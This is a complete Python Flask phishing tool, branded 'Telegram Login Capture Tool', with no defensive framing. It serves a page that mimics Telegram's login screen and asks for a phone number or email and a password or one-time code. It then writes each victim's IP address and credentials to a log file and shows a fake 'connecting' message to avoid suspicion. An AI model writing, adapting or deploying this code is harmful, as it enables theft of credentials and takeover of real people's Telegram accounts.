from flask import Flask, request, render_template_string
import os

app = Flask(__name__)
SAVE_PATH = "/sdcard/HackerTF"
LOG_FILE = os.path.join(SAVE_PATH, "log.txt")
os.makedirs(SAVE_PATH, exist_ok=True)

html_template = """
<!DOCTYPE html>
<html>
<head>
    <title>Telegram</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0088cc; color: white; text-align: center; padding-top: 70px; }
        .box { background: #fff; color: #333; padding: 30px; border-radius: 10px; width: 300px; margin: auto; box-shadow: 0 0 15px rgba(0,0,0,0.2); }
        input, button { width: 90%; padding: 10px; margin: 10px 0; border: none; border-radius: 5px; }
        button { background-color: #0088cc; color: white; font-weight: bold; cursor: pointer; }
        img { width: 50px; margin-bottom: 10px; }
    </style>
</head>
<body>
    <div class="box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg">
        <h2>Log in to Telegram</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Phone number or Email" required><br>
            <input type="password" name="password" placeholder="Password or OTP" required><br>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    ip = request.remote_addr

    log = f"""
[+] Telegram Login
IP: {ip}
Username/Phone: {username}
Password/OTP: {password}
----------------------------
"""
    print(log)
    with open(LOG_FILE, "a") as f:
        f.write(log)

    return "<h3>Connecting to Telegram servers...</h3>"

if __name__ == '__main__':
    os.system('clear' if os.name == 'posix' else 'cls')
    print("\033[1;36m" + "="*40)
    print("         Made by HACKER TF        ")
    print("     Telegram Login Capture Tool  ")
    print("="*40 + "\033[0m")
    print("Server running on: http://localhost:5000\n")
    app.run(host="0.0.0.0", port=5000)